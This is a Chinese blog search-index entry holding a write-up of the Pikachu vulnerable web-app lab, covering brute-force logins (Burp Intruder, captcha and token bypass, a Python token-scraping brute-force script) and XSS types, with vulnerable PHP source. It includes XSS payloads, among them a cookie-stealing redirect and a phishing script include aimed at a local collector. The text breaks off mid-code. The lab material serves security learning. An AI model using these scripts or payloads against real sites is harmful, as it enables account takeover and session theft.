<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web漏洞之再探pikachu</title>
      <link href="/2022/04/07/web-lou-dong-zhi-zai-tan-pikachu/"/>
      <url>/2022/04/07/web-lou-dong-zhi-zai-tan-pikachu/</url>
      
        <content type="html"><![CDATA[<p>写完这篇文章将近花了三天左右的时间，写完的时候已经是深夜了，上上下下差不多将近一万字，这篇文章的初衷是想让自己更进一步去了解一些常见的web漏洞，同时也希望自己对于漏洞并不局限于了解的地步，也希望自己的这篇浅显的文章能对各位师傅有一定的帮助</p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。        </p><p>从来没有哪个时代的黑客像今天一样热衷于猜解密码  —奥斯特洛夫斯基</p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>前后端中并没有设置验证码，token或登录次数限制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//获取post提交的账号和密码</span>      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where username=? and password=md5(?)"</span><span class="token punctuation">;</span>    <span class="token variable">$line_pre</span> <span class="token operator">=</span> <span class="token variable">$link</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//连接数据库进行账号密码比对查询</span>    <span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ss'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token comment">//查询返回数据后num_rows不为0，表示登录成功</span>            <span class="token variable">$html</span><span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;p> login success&lt;/p>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以直接用<code>intruder</code>模块加载字典爆破</p><p><strong>intruder中的四种模式：</strong></p><ul><li>Sniper<br>每次发包只能修改一次选定的参数<br><img src="https://img1.imgtp.com/2022/04/08/624f92df1c34c.png"></li><li>Battering ram<br>选定的参数在每次发包时同时修改<br><img src="https://img1.imgtp.com/2022/04/08/624f92dea17ca.png"></li></ul><ul><li>Pitchfork<br>要配置两段字典，字典按行数一一对应，超出的部分忽略不加载<br><img src="https://img1.imgtp.com/2022/04/08/624f92de5c705.png"></li><li>Cluster bomb<br>以排列组合的方式<br><img src="https://img1.imgtp.com/2022/04/08/624f92df38875.png"></li></ul><p>最后选择可以根据长度来判断是否登录成功</p><p><img src="https://img1.imgtp.com/2022/04/08/624f94372b96d.png"></p><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>验证码可以重复使用</p><p>源码中的注释也写的比较清楚了，在生成验证码的<code>showvcode.php</code>文件只做了<code>session_start</code>，所有生成的验证码在该<code>session</code>中能一直使用，这也就造成了我们再重复发包的时候可以一直利用同一个验证码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//验证验证码是否正确</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p class='notice'>验证码输入错误哦！&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token comment">//应该在验证完成后,销毁该$_SESSION['vcode']</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$vcode</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where username=? and password=md5(?)"</span><span class="token punctuation">;</span>    <span class="token variable">$line_pre</span> <span class="token operator">=</span> <span class="token variable">$link</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ss'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//虽然前面做了为空判断,但最后,却没有验证验证码!!!</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">num_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string single-quoted-string">'&lt;p> login success&lt;/p>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">/inc/showvcode.php  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token comment">//$_SESSION['vcode']=vcode(100,40,30,4);</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">vcodex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//验证码绕过 on server 这里其实还是有一个问题,就是服务端将验证码字符串以明文COOKIE的方式给了前端,那验证码还有什么鸟意义。。。</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bf[vcode]'</span><span class="token punctuation">,</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和前面的方法一样，直接抓包放到<code>intruder</code>中爆破就好了</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9436d656a.png"></p><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>删除前端生成函数</p><p>可以直接在前端源码中查看到定义的js代码</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9437262f7.png"></p><p>直接删除前端的生成的验证码函数，绕过前端的验证码生成</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9436b6ea7.png"></p><p>在抓取到包后就可以直接放入到<code>intruder</code>中爆破</p><p><img src="https://img1.imgtp.com/2022/04/08/624f95831db75.png"></p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>每当一个新的session生成时就会生成一个新的随机token</p><p>在验证账号密码的同时，还会验证当前提交的token和生成的token是否一致</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$html</span><span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;p> login success&lt;/p>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是生成的随机token是可以在前端源代码中查看的<br><img src="https://img1.imgtp.com/2022/04/08/624f96c7078b5.png"></p><p>这就导致，在同一个session，我们可以抓取当前页面的token值，再同时提交账号密码和token来进行爆破</p><p>可以利用<code>burpsuite</code>或<code>python</code>脚本来做爆破</p><p><strong>burpsuite</strong></p><p>抓包放到<code>intruder</code>模块中，在<code>options</code>中找到<code>Grep-Extract</code>选项，点击<code>Add</code></p><p><img src="https://img1.imgtp.com/2022/04/08/624f982dc4bb7.png"></p><p>点击<code>Refetch response</code>获取响应包，鼠标选中token值，bp会自动帮我们设置正则匹配的语句</p><p><img src="https://img1.imgtp.com/2022/04/08/624f98f9566a2.png"></p><p>选择OK，再在当前的<code>options</code>中找到<code>Redirections</code>，把<code>Follow redirections</code>选择为Always</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9973420b4.png"></p><p>来到选定框中，选定要加载的参数，记住要是<strong>Pitchfork</strong>模式</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9c33098b4.png"></p><p>选定token要加载的payload为<code>Recursive grep</code></p><p><img src="https://img1.imgtp.com/2022/04/08/624f9a7153b93.png"></p><p>最后将线程（Number of threads）修改为1，保证一个session对应一个token</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9cd040c29.png"></p><p>开始爆破</p><p><img src="https://img1.imgtp.com/2022/04/08/624f9d0a1a608.png"></p><p><strong>python</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoups <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'456'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token string">'67899'</span><span class="token punctuation">]</span><span class="token comment"># 设置http请求头部信息</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span><span class="token string">' (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'</span><span class="token punctuation">,</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=of5tkhcr385na1oij0h90vr1r0'</span><span class="token punctuation">&#125;</span><span class="token comment"># 创建与该连接的session回话</span>req <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/pikachu/vul/burteforce/bf_token.php#'</span><span class="token punctuation">)</span><span class="token comment"># 抓取页面的token值</span>token <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'token'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">)</span><span class="token keyword">for</span> pa <span class="token keyword">in</span> password<span class="token punctuation">:</span>    req <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://127.0.0.1/pikachu/vul/burteforce/bf_token.php#'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> pa<span class="token punctuation">,</span> <span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'Login'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'success'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破成功，用户名：admin,密码为：%s"</span> <span class="token operator">%</span> pa<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        req <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/pikachu/vul/burteforce/bf_token.php#'</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'token'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">)</span><span class="token operator">%</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Cross-Site-Script（xss）"><a href="#Cross-Site-Script（xss）" class="headerlink" title="Cross-Site Script（xss）"></a>Cross-Site Script（xss）</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><p>一般XSS可以分为如下几种常见类型：<br>1.反射性XSS;<br>2.存储型XSS;<br>3.DOM型XSS;</p><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p>又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端，get型则表示在url处就可以插入js代码</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在插入代码前，前端代码有限制输入框的字数限制，先修改前端代码，突破字数限制，也可以直接在url中插入js代码</p><p><img src="https://img1.imgtp.com/2022/04/08/624fa18c2b95f.png"></p><p>将上面的js代码插入到输入框中，可以看到有弹窗出现</p><p><img src="https://img1.imgtp.com/2022/04/08/624fa1c6453d9.png"></p><p><strong>*注</strong>：弹框只是直观的检测是否存在xss漏洞的输入点</p><p><strong>我们看看源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'kobe'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>愿你和<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>一样，永远年轻，永远热血沸腾！&lt;/p>&lt;img src='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$PIKA_ROOT_DIR</span><span class="token punctuation">&#125;</span></span>assets/images/nbaplayer/kobe.png' />"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>who is <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>,i don't care!&lt;/p>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>源码中直接将我们输入的message插入到了页面的html当中，这就导致我们可以插入js代码到网页中并执行</p><h3 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h3><p>post型表示插入的js代码在请求包中</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先登录 admin/123456 </p><p>来到输入框继续插入上面的js代码，得到和上面一样的结果</p><p><img src="https://img1.imgtp.com/2022/04/08/624fa1c6453d9.png"></p><p>在hackbar插件中，我们可以看到加载出来的js代码在POST Data中</p><p><img src="https://img1.imgtp.com/2022/04/08/624fa69608253.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'kobe'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>愿你和<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>一样，永远年轻，永远热血沸腾！&lt;/p>&lt;img src='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$PIKA_ROOT_DIR</span><span class="token punctuation">&#125;</span></span>assets/images/nbaplayer/kobe.png' />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>who is <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>,i don't care!&lt;/p>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里虽然是POST的请求，但是处理message的方式是不变的，依旧可以直接插入js代码到html中</p><h3 id="存储性xss"><a href="#存储性xss" class="headerlink" title="存储性xss"></a>存储性xss</h3><p>存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接将js代码插入到留言框中，可以看到js代码已经存储到服务端了</p><p><img src="https://img1.imgtp.com/2022/04/08/624fab3028cbf.png"></p><p>每次点击该页面都会执行插入的js代码</p><p><img src="https://img1.imgtp.com/2022/04/08/624fab670d4e0.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//将message信息插入到数据库中if(array_key_exists("message",$_POST) &amp;&amp; $_POST['message']!=null)&#123;    $message=escape($link, $_POST['message']);    $query="insert into message(content,time) values('$message',now())";    $result=execute($link, $query);...//查询message信息数据直接插入到html中<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from message"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document”对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p><p>它是基于DoM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互。</p><p>其通过修改页面DOM节点数据信息而形成的ⅩSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p>一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&#39;&gt;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;    function domxss()&#123;        var str &#x3D; document.getElementById(&quot;text&quot;).value;        document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;&#x2F;a&gt;&quot;;    &#125;    &#x2F;&#x2F;试试：&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;    &#x2F;&#x2F;试试：&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过js的处理，用户输入的参数被处理为一些标签中属性的值，通过对值的闭合拼接，来达到添加js代码的目的</p><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&#39;&gt;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;   function domxss()&#123;       var str &#x3D; window.location.search;       var txss &#x3D; decodeURIComponent(str.split(&quot;text&#x3D;&quot;)[1]);       var xss &#x3D; txss.replace(&#x2F;\+&#x2F;g,&#39; &#39;); &#x2F;&#x2F;alert(xss);       document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;&quot;;    &#125;       &#x2F;&#x2F;试试：&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;       &#x2F;&#x2F;试试：&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只是多了一步对url的处理，本质上还是没有对用户输入的数据进行过滤</p><h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><p>攻击者的js代码会插入到管理员的后台管理中，当管理员登录后台时可以记录cookie等信息</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;document.location &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;pkxss&#x2F;xcookie&#x2F;cookie.php?cookie&#x3D;&#39; + document.cookie;&lt;&#x2F;script&gt;&#x2F;&#x2F;盗取cookie&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;pkxss&#x2F;xfish&#x2F;fish.php&quot;&gt;&lt;&#x2F;script&gt;&#x2F;&#x2F;账号密码钓鱼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/04/08/624fc715aa5cc.png"></p><p>管理员登录后台</p><p><img src="https://img1.imgtp.com/2022/04/08/624fc75bc7a14.png"></p><p>xss后台成功获取cookie信息</p><p><img src="https://img1.imgtp.com/2022/04/08/624fc79c75689.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span 